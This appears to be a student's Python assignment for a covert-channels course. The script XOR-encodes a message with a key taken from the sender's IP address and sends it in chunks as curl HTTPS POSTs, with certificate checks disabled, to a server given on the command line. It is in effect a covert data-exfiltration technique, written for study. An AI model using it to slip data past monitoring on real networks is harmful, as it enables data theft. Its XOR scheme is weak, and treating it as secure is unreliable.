######################################################################
# Course..: Covert Channels                                          #
# ID......: #######                                                  #
# Student.: Ramon Benitez-Pagan                                      #
#                                                                    #
# <covert_send_2.py>                                                 #
# Implements a custom covert channel by sending encode data on an    #
# encrypted tunnel (TLS/HTTPS) using cURL and a standard web server  #
# to capture the traffic.                                            #
######################################################################

import sys, subprocess, socket

######################################################################
# get_ip() snippet retrieved from:                                   #
# URL: stackoverflow.com/questions/166506/finding-local-ip-addresses #
# -using-pythons-stdlib                                              #
######################################################################

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


######################################################################
# CUSTOM CODE DEVELOPMENT                                            #
######################################################################

def send(ip,dst,val):
    subprocess.call([
        'curl',
        '-X',
        'POST',
        'https://'+str(dst)+'/data/index.php',
        '-d',
        'ext='+str(ip)+':'+str(val),
        '--tlsv1.3',
        '--insecure'
    ])

# myMsg = "HolaHOLAHOlahoLAHh"
DST = str(sys.argv[1])
myMsg = str(sys.argv[2])
myChunks = int(len(myMsg)/4) if (int(len(myMsg)%4) == 0) else (int(len(myMsg)/4)+1)

myFinalData = []

for x in range(0, myChunks):
    myChunkData = myMsg[x*4:(x*4)+4]
    while len(myChunkData) < 4:
        myChunkData = myChunkData + "_"
    
    myFinalData.append(myChunkData)

myMsgHex = myMsg.encode("utf-8").hex()
myIP = myIP2 = get_ip()
print(myIP)
myIP = myIP.split(".")
print("010.000.002.005")
print("_X_._X_.__X.__X")
myIP[0] = '{:0>3}'.format(myIP[0])[1]
myIP[1] = '{:0>3}'.format(myIP[1])[1]
myIP[2] = '{:0>3}'.format(myIP[2])[2]
myIP[3] = '{:0>3}'.format(myIP[3])[2]

myKey = "".join(myIP)
myKeyHex = myKey.encode("utf-8").hex()
myKeyBin = "{:0>32}".format(bin(int(myKeyHex, 16))[2:])
myKeyDec = int(myKeyBin,2)

print("My IP:",myIP)
print("My key:",myKey)
print("My key hex:",myKeyHex)
print("My key bin:",myKeyBin)
print("My key dec:",myKeyDec)

myXORData = []
myXORDataDec = []
for chunk in myFinalData:
    myChunkHex = chunk.encode("utf-8").hex()
    myChunkBin = "{:0>32}".format(bin(int(myChunkHex, 16))[2:])
    exclu = "{:0>32}".format(bin(int(myChunkBin,2) ^ int(myKeyBin,2))[2:])
    myXORData.append(exclu)
    
    print(chunk)
    print("Key bin: ",myKeyBin)
    print("chk bin: ",myChunkBin)
    print("XOR bin: ",exclu)

send(myIP2,DST,0000000000)

for x in range(0, len(myXORData)):
    myXORDataDec.append(int(myXORData[x],2))
    send(myIP2,DST,myXORDataDec[x])

send(myIP2,DST,4294967295)

print("Data:", myXORDataDec)
print()
print("Finished.")

######################################################################
# References:                                                        #
# [0] stackoverflow.com/questions/166506/finding-local-ip-addresses  #
# -using-pythons-stdlib                                              #
# [1] binarytides.com/raw-socket-programming-in-python-linux/        #
# [2] https://curl.se/
#                                                                    #
######################################################################